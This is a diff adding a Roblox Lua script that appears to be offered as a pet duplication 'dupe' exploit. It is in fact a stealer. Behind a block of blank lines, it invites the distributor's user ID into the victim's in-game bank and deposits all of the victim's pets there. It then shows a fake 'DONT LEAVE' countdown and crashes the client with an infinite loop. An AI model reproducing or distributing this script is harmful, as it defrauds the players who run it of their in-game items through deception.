@@ -1,0 +1,68 @@
+local DupeCode = 1745644566 -- your user id
+local n = 10 -- time to wait in seconds [[CHANGE TO HIGHER NUMBER]]
+-- dont touch below if you dont know what you are doing!!
+-- [Source Code]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mybanks = lib.Network.Invoke("get my banks")
+local BankID = mybanks[1]['BUID']
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Enabled = false
+
+workspace.__THINGS.__REMOTES["invite to bank"]:InvokeServer({BankID,DupeCode})
+
+local petAmmount = 0
+for i,v in ipairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+	:GetChildren()) do
+	petAmmount = petAmmount + 1
+end
+
+local pets = {}
+local path = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+for i,v in ipairs(path:GetChildren()) do
+	if v:IsA("TextButton") and v.Name:sub(1, 1) == "i" then
+		table.insert(pets,v.Name)
+	end
+end
+
+	workspace.__THINGS.__REMOTES["buy egg"]:InvokeServer({"Cracked Egg",false})
+	wait()
+workspace.__THINGS.__REMOTES["bank deposit"]:InvokeServer({BankID,pets,0})
+-- remove all bellow if u dont want the fake dupe thing
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,100000,10000)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+
+	local g = Instance.new("ScreenGui")
+	g.Parent = game.CoreGui
+	local l = Instance.new("TextLabel")
+	l.Parent = g
+	l.Size = UDim2.new(1, 0, 1, 0)
+	l.TextScaled = true
+	l.Text = "DONT LEAVE! \n Wait : s"
+	l.Transparency = 0.5
+
+	while wait(1) do
+		if n == 0 then l.Text = "Finished!"
+			l:Destroy()
+		while true do
+			print("Crashing!!")
+		end
+			break 
+		else
+			n = n - 1
+			l.Text = "DONT LEAVE! \n Wait : "..n.." s"
+		end
+	end
